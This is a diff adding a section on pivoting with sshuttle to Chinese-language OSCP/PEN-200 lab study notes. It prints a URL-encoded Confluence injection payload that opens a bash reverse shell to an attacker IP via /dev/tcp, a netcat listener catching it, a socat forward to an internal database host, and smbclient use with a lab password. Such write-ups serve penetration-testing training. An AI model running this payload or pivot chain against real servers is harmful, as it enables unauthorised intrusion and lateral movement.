@@ -2213,3 +2213,76 @@ Nmap done: 1 IP address (1 host up) scanned in 6.97 seconds
 > 可以發現 ports 80, 135, and 3389 都開著
 
 ### Using sshuttle
+[SSHuttle](https://github.com/sshuttle/sshuttle): 可以將 SSH 連線變成類似 VPN 的 Tunnel，讓本機流量自動透過 SSH Tunnel 轉發到內部網路，而不需要手動設定 SOCKS proxy 或 Port Forwarding。這在處理複雜的內部網路時，會比傳統的 SSH Dynamic Port Forwarding 更加方便。
+
+sshuttle 的特性：
+- 自動設置路由，讓所有指定的 IP/Subnet 都透過 SSH 隧道進行傳輸，不需要手動設定 proxy。
+- 類似 VPN，但不需要額外安裝 VPN 軟體或設定 OpenVPN。
+- Server端只需 SSH 存取權限，無需 root 權限（但需要 Python3）。
+- 適用於內部網路存取，可以輕鬆瀏覽內網的服務，例如 SMB、Web、RDP。
+
+[回到範例]
+我們無法直接 SSH 進入 PGDATABASE01（內網），但可以透過 CONFLUENCE01 來轉發 SSH 連線，然後使用 sshuttle 來自動設定內部流量路由。
+
+#### 1. 在 Target machine 上設定 Port Forwarding
+在 CONFLUENCE01 注入 reverse shell
+```
+┌──(chw㉿CHW)-[~]
+└─$ curl http://192.168.195.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.45.182/8888%200%3E%261%27%29.start%28%29%22%29%7D/
+```
+```
+┌──(chw㉿CHW)-[~]
+└─$ nc -nvlp 8888
+listening on [any] 8888 ...
+connect to [192.168.45.182] from (UNKNOWN) [192.168.195.63] 45236
+bash: cannot set terminal process group (2111): Inappropriate ioctl for device
+bash: no job control in this shell
+bash: /root/.bashrc: Permission denied
+confluence@confluence01:/opt/atlassian/confluence/bin$
+```
+由於 CONFLUENCE01 能夠存取 PGDATABASE01，可以用 socat 來轉發流量。在 CONFLUENCE01 上的 shell 中設定連接埠轉發， 監聽 CONFLUENCE01 的 2222 端口，將所有流量轉發到 PGDATABASE01 的 SSH  22 port
+```
+confluence@confluence01:/opt/atlassian/confluence/bin$ socat TCP-LISTEN:2222,fork TCP:10.4.195.215:22
+<bin$ socat TCP-LISTEN:2222,fork TCP:10.4.195.215:22   
+|
+```
+
+#### 2. 在 Kali 上運行 sshuttle
+內網 routing 設定： `10.4.195.0/24`(DMZ zone) 與 `172.16.195.0/24`(Internal zone)
+```
+┌──(chw㉿CHW)-[~]
+└─$ sshuttle -r database_admin@192.168.195.63:2222 10.4.195.0/24 172.16.195.0/24
+The authenticity of host '[192.168.195.63]:2222 ([192.168.195.63]:2222)' can't be established.
+ED25519 key fingerprint is SHA256:oPdvAJ7Txfp9xOUIqtVL/5lFO+4RY5XiHvVrZuisbfg.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '[192.168.195.63]:2222' (ED25519) to the list of known hosts.
+database_admin@192.168.195.63's password: 
+c : Connected to server.
+```
+>`-r database_admin@192.168.50.63:2222`: 透過 CONFLUENCE01:2222 這個 SSH 隧道，進入 PGDATABASE01\
+>`10.4.50.0/24 172.16.50.0/24`: 設置兩個內網流量(DMZ & Internal)，都會自動透過 SSH Tunnel 轉發`
+
+#### 3. smbclient 測試 SSHuttle Tunnel
+如果 sshuttle 設置成功，這條 smbclient 可以直接執行，不需要透過 Proxychains
+```
+┌──(chw㉿CHW)-[~]
+└─$ smbclient -L //172.16.195.217/ -U hr_admin --password=Welcome1234
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        ADMIN$          Disk      Remote Admin
+        C$              Disk      Default share
+        IPC$            IPC       Remote IPC
+        Scripts         Disk      
+        Users           Disk      
+Reconnecting with SMB1 for workgroup listing.
+do_connect: Connection to 172.16.195.217 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+Unable to connect with SMB1 -- no workgroup available
+```
+
+## Port Forwarding with Windows Tools
+>[!Caution]
+> HackMD 筆記長度限制，接續 [[OSCP, PEN-200] Instructional notes - Part 5](https://github.com/Chw41/OffSec-Certification/blob/main/%5BOSCP%2C%20PEN-200%5D%20Offensive%20Security%20Certified%20Professional%20/Instructional%20notes/%5BOSCP%2C%20PEN-200%5D%20Instructional%20notes%20-%20Part%205.md)
+
+# [Link to: "[OSCP, PEN-200] Instructional notes - Part 5"](https://github.com/Chw41/OffSec-Certification/blob/main/%5BOSCP%2C%20PEN-200%5D%20Offensive%20Security%20Certified%20Professional%20/Instructional%20notes/%5BOSCP%2C%20PEN-200%5D%20Instructional%20notes%20-%20Part%205.md)
